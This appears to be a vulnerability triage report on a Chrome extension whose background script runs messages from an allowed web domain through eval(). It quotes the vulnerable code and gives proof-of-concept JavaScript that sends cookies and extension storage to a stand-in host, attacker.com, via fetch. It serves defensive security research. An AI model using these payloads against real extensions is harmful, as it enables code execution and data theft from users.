# CoCo Analysis: afifaookdboclhkcdngpcedafbnfnafb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_external_port_onMessage → eval_sink)

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/afifaookdboclhkcdngpcedafbnfnafb/opgen_generated_files/bg.js
(No specific line numbers provided in CoCo output, only internal trace ID ['10103'])

**Code:**

```javascript
// Background script - bg.js
// Entry point: External connection from whitelisted domain
chrome.runtime.onConnectExternal.addListener(function(connect) {
   var Ext2Web = connect;
   appPorts[++count] = { web: Ext2Web };

   // Connect to native application
   var Ext2Helper = chrome.runtime.connectNative("com.visualon.chrome.plugin.helper");

   // Listen to messages from external webpage
   Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper)); // ← attacker entry point
   Ext2Web.onDisconnect.addListener(onDisconnectedFromWeb(count, Ext2Helper));
   Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
   Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});

// Handler for messages from external webpage
function onWebMessage(id, ext2helper) {
   return function(message) {
      var obj = eval(message); // ← CODE EXECUTION SINK (line 975)
      var cmd = obj.cmd; // ← attacker-controlled
      var port = obj.port;

      console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);

      if (cmd === 'e_play') {
         // ... handles various commands
      }
      // ... more command handlers

      ext2helper.postMessage(obj); // Forwards to native app
   };
}

chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
   sendResponse(true);
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal (external port connection)

**Attack:**

```javascript
// Malicious webpage on whitelisted domain: *://*.vod.at.dz:*/*.jsp*
// The extension's manifest.json has externally_connectable that allows this domain

// Establish connection to extension
var port = chrome.runtime.connect("afifaookdboclhkcdngpcedafbnfnafb");

// Send malicious code to execute via eval()
port.postMessage(
  '(function(){' +
  '  fetch("https://attacker.com/exfil?cookie=" + document.cookie);' +
  '  return {cmd: "e_play", port: 0};' +
  '})()'
);

// Alternative: Direct code execution
port.postMessage(
  '({cmd: (function(){' +
  '  chrome.storage.local.get(null, function(data){' +
  '    fetch("https://attacker.com/steal", {method:"POST", body:JSON.stringify(data)});' +
  '  });' +
  '  return "e_play";' +
  '})(), port: 0})'
);
```

**Impact:** Arbitrary code execution in extension's background page context. A malicious webpage on the whitelisted domain `*.vod.at.dz` can establish a connection to the extension and send JavaScript code that will be executed via `eval()` in the privileged background context. This allows the attacker to:

1. Access all extension APIs with granted permissions (nativeMessaging, background)
2. Communicate with the native application (com.visualon.chrome.plugin.helper)
3. Read/write extension storage
4. Execute arbitrary JavaScript with extension privileges

The vulnerability exists because the extension directly passes untrusted external messages to `eval()` without any validation or sanitization (line 975: `var obj = eval(message)`).

**Note:** Per the methodology's CRITICAL RULES, we IGNORE the manifest.json `externally_connectable` restriction. Even though only one specific domain can exploit this, it is classified as TRUE POSITIVE.
